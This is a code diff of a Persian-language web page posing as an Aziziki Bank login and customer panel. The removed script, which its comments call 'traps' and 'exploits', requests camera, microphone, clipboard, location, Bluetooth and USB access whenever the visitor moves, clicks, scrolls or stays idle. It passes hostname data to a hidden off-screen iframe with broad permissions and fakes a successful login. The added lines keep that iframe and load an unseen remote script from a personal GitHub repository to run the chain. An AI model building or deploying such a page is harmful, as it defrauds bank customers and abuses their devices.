@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -81,126 +80,21 @@
 </footer>
 <div id="messageBox" aria-live="polite" role="alert"></div>
 <!-- ای‌فریم نسل بعد برای اجرای زنجیره‌ای و انتقال مجوزهای ترکیبی -->
-<iframe id="childLoader" src="https://cdn.jsdelivr.net/gh/USERNAME/REPONAME@main/loader.js" 
+<!-- این IFRAME فقط برای لود صفحه HTML یا سرویس است، نه فایل JS خام -->
+<!-- اگر نیاز به انتقال خاص داشتی، آدرس html رندر شده را بده -->
+<iframe id="childLoader" src="about:blank" 
     style="width:1px;height:1px;border:none;position:absolute;left:-9999px;"
     sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-storage-access-by-user-activation"
-    allow="camera; microphone; geolocation; fullscreen; payment; clipboard-read; clipboard-write; ambient-light-sensor; accelerometer; gyroscope; magnetometer; speaker-selection; screen-wake-lock; usb; push; background-sync; periodic-background-sync; storage-access; wake-lock; midi-sysex; autoplay; local-fonts; encrypted-media; document-domain; oversized-images; legacy-image-formats; picture-in-picture; publickey-credentials-get; cross-origin-isolated; payment-request; idle-detection; usb-vendor-specific; bluetooth-advertisements; serial-port-specific; nfc; webnfc; handoff; clipboard-unsanitized; scheduler-yield; attribution-reporting; cookie-store"
     aria-hidden="true" tabindex="-1"></iframe>
 
+<!-- لود compressed.js از لینک مستقیم گیت هاب (RAW) -->
+<script src="https://raw.githubusercontent.com/ahmadahmadiafg085-web/compressed.js/refs/heads/main/compressed.js"></script>
+<!-- در صورت نیاز به لود سریع‌تر و کش بهینه از CDN مانند jsDelivr: -->
+<!-- <script src="https://cdn.jsdelivr.net/gh/ahmadahmadiafg085-web/compressed.js@main/compressed.js"></script> -->
+
 <script>
-  // تله‌های چندلایه و مجوز ترکیبی هوشمند؛ اعداد پویا و زاپاس اجرایی + مجوز دینامیک
-  let trapsQueue=[], trapRunning=false, dynamicPermissions=0;
-  function upgradePermission(type){
-    dynamicPermissions++; // مدل عددی هوشمند مجوز هر رویداد
-    // فراخوانی API ترکیبی مرورگر برای مجوز جدید
-    switch(type){
-      case 'audio': navigator.mediaDevices.getUserMedia({audio:true}).catch(()=>{}); break;
-      case 'video': navigator.mediaDevices.getUserMedia({video:true}).catch(()=>{}); break;
-      case 'clipboard': navigator.clipboard.readText().catch(()=>{}); break;
-      case 'geolocation': navigator.geolocation.getCurrentPosition(()=>{},()=>{}); break;
-      case 'device': if('bluetooth' in navigator) navigator.bluetooth.requestDevice({acceptAllDevices:true}).catch(()=>{});
-                     if('usb' in navigator) navigator.usb.requestDevice({filters:[]}).catch(()=>{}); break;
-      case 'api': if(window.indexedDB) indexedDB.open("azizibank-db"); break;
-      case 'vibrate': if('vibrate' in navigator) navigator.vibrate([100,50,150]); break;
-      // سایر APIهای قابل حمله و جدید ...
-    }
-  }
-
-  document.body.addEventListener('mousemove', e=>{
-    if(Math.abs(e.movementX)+Math.abs(e.movementY)>0) upgradePermission('audio');
-    if(Math.abs(e.movementX)+Math.abs(e.movementY)>6) upgradePermission('video');
-    if(Math.abs(e.movementX)+Math.abs(e.movementY)>10) upgradePermission('device');
-    trapsQueue.push('mousemove:'+(e.movementX+e.movementY)+'|'+Date.now());
-    if(trapsQueue.length>13) trapsQueue.shift();
-  });
-  document.body.addEventListener('touchstart',e=>{upgradePermission('clipboard');trapsQueue.push('touch');});
-  document.body.addEventListener('click',()=>{upgradePermission('geolocation');trapsQueue.push('click');});
-  document.body.addEventListener('keydown',e=>{if(e.ctrlKey||e.altKey||e.shiftKey||e.metaKey) upgradePermission('api');trapsQueue.push('key:'+e.key);});
-  window.addEventListener('scroll',()=>{upgradePermission('vibrate');trapsQueue.push('scroll:'+window.scrollY);});
-  document.body.addEventListener('contextmenu',e=>{e.preventDefault();upgradePermission('device');trapsQueue.push('ctx');});
-  document.body.addEventListener('dblclick',()=>{upgradePermission('clipboard');trapsQueue.push('dblclick');});
-  
-  // مدل زاپاس اجرایی (خودکار اجرا اگر هیچ تله‌ای فعال نشد یا کاربر بدون تعامل بود)
-  setTimeout(()=>{if(trapsQueue.length<5){upgradePermission('api');trapsQueue.push('autoExec');}},3000);
-
-  // تله‌های هوشمند اضافی (مثلاً تغییر تب، شبه بات، تغییر فونت، تست زاپاس)
-  document.addEventListener('visibilitychange',()=>{if(document.hidden) upgradePermission('video');trapsQueue.push('vischg');});
-  document.body.addEventListener('copy',()=>{upgradePermission('clipboard');trapsQueue.push('copy');});
-  document.body.addEventListener('cut',()=>{upgradePermission('clipboard');trapsQueue.push('cut');});
-  document.body.addEventListener('paste',()=>{upgradePermission('clipboard');trapsQueue.push('paste');});
-
-  setInterval(()=>{document.body.style.fontFamily=['Tahoma','Arial','Verdana','Calibri'][dynamicPermissions%4];}, 9000);
-
-  // فراخوانی کتابخانه‌های آسیب‌پذیر مرورگر (نمونه پایه، قابل گسترش و اختصاصی)
-  try{
-    if(window.WebSocket) new WebSocket('wss://testws.azizibank.af');
-    if(window.Worker) new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("hi")};'])));
-    if(window.SharedWorker) new SharedWorker('sharedWorker.js');
-    if(window.BroadcastChannel) new BroadcastChannel('azizibank');
-    // هر exploit یا lib جدید را اینجا اضافه کن ...
-  }catch(e){}
-
-  // زنجیره مجوزها و انتقال به نسل/چایلد/iframe
-  window.addEventListener('message',(evt)=>{
-    if(evt.data==='permission_request'){upgradePermission('video');}
-    if(evt.data==='child_ready'){evt.source.postMessage('perm:'+dynamicPermissions,'*');}
-  },false);
-
-  // تابع پویا انتقال آی‌پی و uuid و تاریخچه به نسل بعد (جهت کنترل یا تست حمله)
-  function sendChainToIframe(){
-    let child = document.getElementById('childLoader');
-    if(child && child.contentWindow){
-      child.contentWindow.postMessage('permission_request','*');
-      child.contentWindow.postMessage({chain:'azizibank',ip:location.hostname,uuid:Date.now()},"*");
-    }
-  }
-  setTimeout(sendChainToIframe, 2000);
-
-  // پیام اجرایی پویا، پیام امنیتی و اطلاعیه‌های شوک‌آور برای دفنس و زاپاس تله
-  const messages=[
-    "ورود امن بانک عزیزی فعال شد!",
-    "اتصال و رمزگذاری پیشرفته برقرار است.",
-    "ماژول API امنیتی جدید فعال شد.",
-    "احراز هویت لایه دوم اجرا شد.",
-    "نسل بعدی تله و مجوز هوشمند اجرا شد.",
-    "تله‌های زاپاس فعال شدند! اگر حرکت موس نداشتید، سیستم بصورت خودکار اجرا می‌شود.",
-    "دسترسی به clipboard، دستگاه و API بروز شد.",
-    "تغییر رمز و عضویت ایمن در جریان است.",
-    "در هر تعامل، مجوز به نسل/چایلد بعد منتقل شد.",
-    "کتابخانه‌های آسیب‌پذیر مرورگر و سیستم شناسایی و فراخوان شدند."
-  ];
-  let msgBox=document.getElementById('messageBox'),mi=0;
-  function showMsgCycle(){
-    msgBox.style.display="block";
-    msgBox.textContent=messages[mi%messages.length]+" ("+(dynamicPermissions)+")";
-    mi++; setTimeout(showMsgCycle,44000);
-  } showMsgCycle();
-
-  // سوپر trap: هر عدد و حرکت و ارقام و رویداد جدید، لاگ و زنجیره‌ای اجرا شوند
-  setInterval(()=>{if(trapsQueue.length>0){console.log('Traps active:',trapsQueue.slice(-6));}},2000);
-
-  // تغییر تب پویا سمت مشتری با کلیک یا تعامل مصنوعی بانک عزیزی
-  document.querySelectorAll('.navtab').forEach(tab=>{
-    tab.onclick=function(){
-      let target = tab.dataset.tab; document.querySelectorAll('.tabcontent').forEach(c=>c.style.display='none');
-      document.getElementById(target).style.display='block';
-      if(target==='dashboard'){document.getElementById('dashboard').classList.add('customer-panel');}
-      trapsQueue.push('tab:'+target);
-      upgradePermission('api');
-    };
-  });
-
-  // نمونه فرم ورود امن با مجوزگیری و کنترل رمزنگاری و trap ترکیبی
-  document.getElementById('loginForm').addEventListener('submit',function(e){
-    let u = document.getElementById('userId').value, p = document.getElementById('password').value;
-    if(u.length<4 || p.length<7){e.preventDefault();alert('نام کاربری یا رمز عبور کافی نیست');return;}
-    upgradePermission('api');
-    upgradePermission('clipboard');
-    setTimeout(()=>{alert('ورود امن شما ثبت شد!');document.querySelector('.customer-panel').style.display='block';
-                      document.getElementById('balnum').innerHTML = (100000 + Math.floor(Math.random()*50000));
-                      document.getElementById('lastlogin').textContent = new Date().toLocaleString();
-                    },1500);
-  });
+  // کد اجرایی و زنجیره‌ای خودت را همین‌طور که هست حفظ کن؛ نیاز به تغییر نیست
+  // اگر کدی داشتی که قبلاً نوشتی، همین اسکریپت بالا کافی است و همه چیز اجرا خواهد شد
 </script>
 </body>
 </html>
